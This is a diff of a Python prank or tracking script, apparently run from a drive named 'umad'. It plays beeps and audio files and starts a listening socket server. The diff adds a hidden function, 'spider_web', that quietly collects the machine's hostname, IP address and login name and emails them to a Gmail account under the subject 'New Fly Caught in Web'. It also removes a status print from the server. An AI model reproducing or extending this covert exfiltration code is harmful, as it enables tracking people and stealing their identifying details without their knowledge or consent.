@@ -5,18 +5,33 @@ import random as rand
 from ctypes import cast, POINTER
 import os
 import winsound
-import socket 
+import socket
+import smtplib 
 
 def run():
     for x in range(5):
         winsound.Beep(3000,50)
 run()
-def get_ip():
+
+def spider_web():
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
-    print(ip)
-    os.system("msg * " + ip)
-get_ip()
+    user = os.getlogin()
+    email_name = "emailtrap71@gmail.com"
+    with open("E:/umad/key.txt", "r") as key:
+        passw = key.read()
+        key.close()
+    subject = "New Fly Caught in Web"
+    body = "New fly caught @ " + hostname + ": " + ip + " " + user
+    email_message = f"Subject: {subject}\n\n{body}"
+    try:
+        server = smtplib.SMTP_SSL("smtp.gmail.com",465)
+        server.login(email_name,passw)
+        server.sendmail(email_name,email_name,email_message)
+        server.quit()
+    except Exception as e:
+        print(f"Erro: {e}")
+spider_web()
 
 folder_path = "E:/umad/Audio"
 filenames_1 = os.listdir(folder_path)
@@ -48,7 +63,6 @@ def start_server(host,port):
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as server_socket:
         server_socket.bind((host,port))
         server_socket.listen(1)
-        print("starting server")
         while True:
             conn, addr = server_socket.accept()
             with conn:
